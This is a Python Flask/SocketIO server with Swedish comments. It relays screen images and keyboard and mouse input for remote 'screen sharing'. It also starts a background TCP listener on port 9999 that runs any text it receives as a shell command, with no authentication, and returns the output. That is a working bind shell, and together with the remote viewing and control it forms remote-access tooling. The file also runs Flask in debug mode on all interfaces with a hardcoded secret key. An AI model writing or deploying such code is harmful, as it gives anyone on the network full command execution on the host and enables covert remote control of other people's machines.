import socket
import subprocess
from flask import Flask, render_template
from flask_socketio import SocketIO, emit

# Flask och SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

# Serverkonfiguration
HOST = ''  # Lyssna på alla nätverksgränssnitt
PORT = 9999  # Port för din befintliga kommunikation

# Flask-rutter
@app.route('/')
def index():
    """Returnera HTML-sidan för skärmdelning."""
    return render_template('index.html')

# Hantera inmatning från klienter
@socketio.on('input', namespace='/my_namespace')
def handle_input(data):
    """
    Tar emot tangentbord/mus-inmatning från webbsidan och 
    skickar den till alla anslutna klienter.
    """
    print(f"Server tar emot inmatning: {data}")
    emit('input', data, broadcast=True, namespace='/my_namespace')

# Hantera skärmdelning
@socketio.on('screen', namespace='/my_namespace')
def handle_screen(data):
    """
    Tar emot skärmbild från klienten och skickar vidare till webbsidan.
    """
    print(f"Server tar emot bilddata, storlek: {len(data['image'])} bytes")
    emit('stream', data, broadcast=True, namespace='/my_namespace')

# Din befintliga serverlogik (socket-server)
def start_socket_server():
    """
    Hanterar den befintliga socket-servern för att lyssna på inkommande
    anslutningar och köra kommandon.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Lyssnar på port {PORT}...")
        conn, addr = s.accept()
        with conn:
            print(f"Ansluten från {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                cmd = data.decode('utf-8').strip()
                if cmd.lower() == 'exit':
                    print("Avslutar anslutning...")
                    break
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                conn.sendall(output)

# Starta Flask och SocketIO
if __name__ == '__main__':
    # Starta din befintliga socket-server i en bakgrundsuppgift
    socketio.start_background_task(target=start_socket_server)
    
    # Kör Flask-servern med SocketIO
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
